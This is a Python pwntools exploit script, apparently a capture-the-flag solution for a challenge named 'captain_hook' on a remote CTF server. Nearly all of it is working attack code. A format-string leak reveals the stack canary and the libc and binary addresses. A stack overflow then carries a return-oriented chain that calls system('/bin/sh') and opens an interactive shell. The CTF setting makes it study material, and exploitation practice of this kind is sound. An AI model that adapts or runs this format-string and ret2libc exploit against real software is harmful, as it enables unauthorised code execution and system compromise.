from pwn import *
from time import sleep
#p=process("./captain_hook")
p=remote("sharkyctf.xyz",20336)

def alloc(index,name,age,date):
	p.sendline("2")
	p.recvuntil(" [ Character index ]: ")
	p.sendline(str(index))
	p.recvuntil("Name: ")
	p.sendline(name)
	p.recvuntil("Age: ")
	p.sendline(str(age))
	p.recvuntil("(mm/dd/yyyy): ")
	p.sendline(date)
	p.recvuntil("n@pwnuser:~$")

def edit(index,name,age,date):
	p.sendline("4")
	p.recvuntil(" [ Character index ]: ")
	p.sendline(str(index))
	p.recvuntil("Name: ")
	p.sendline(name)
	p.recvuntil("Age: ")
	p.sendline(str(age))
	p.recvuntil("(mm/dd/yyyy): ")
	p.sendline(date)
	p.recvuntil("n@pwnuser:~$")

def free(index):
	p.sendline("5")
	p.recvuntil("[ Character index ]:")
	p.sendline(str(index))
	p.recvuntil("n@pwnuser:~$")

def read(index):
	p.sendline("3")
	p.recvuntil("[ Character index ]:")
	p.sendline(str(index))
	return p.recvuntil("n@pwnuser:~$")

alloc(0,"AAAA",22,"17/02/1998")
edit(0,"A"*10+"-%13$p-%19$p-%7$p",22,"17/02/1998")

data=read(0).split("\n")[2].split(" ")[5][11:-1].split("-")
canary=int(data[0][2:],16)
libc_start=int(data[1][2:],16)
bin_base=int(data[2][2:],16)-0x1a5f260
base=libc_start-0x0000000000021ab0-231
system=base+0x000000000004f440
binsh=base+0x1b3e9a
pop_rdi=base+0x000000000002155f
ret=base+0x00000000000008aa
print "canary :",hex(canary)
print "libc_start :",hex(libc_start)
print "base :",hex(base)
print "system :",hex(system)
print "binsh :",hex(binsh)
print "bin_base :",hex(bin_base)
p.sendline("")

payload=""
payload+="A"*40
payload+=p64(canary)
payload+="A"*8
payload+=p64(ret)
payload+=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system)
#+348
p.sendline("4")
p.sendline("0")
p.sendline(payload)
p.sendline("11")
p.sendline("11/11/1111")
p.interactive()
#edit(0,payload,22,"AAAA")






